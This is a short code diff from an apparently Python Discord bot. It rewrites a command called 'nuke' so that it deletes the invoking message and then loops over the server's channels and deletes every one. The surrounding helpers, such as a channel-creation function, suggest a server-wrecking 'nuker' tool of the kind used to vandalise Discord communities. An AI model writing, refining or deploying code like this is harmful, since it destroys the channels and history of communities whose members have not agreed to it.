@@ -109,11 +109,8 @@ async def sdr(ctx):
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild.id
-    def dc(i):
-        session.delete(
-          f"https://discord.com/api/v9/channels/{i}",
-          headers=headers
-        )
+    for channel in list(ctx.guild.channels):
+        await channel.delete()
     def cc(i):
         json = {
           "name": i
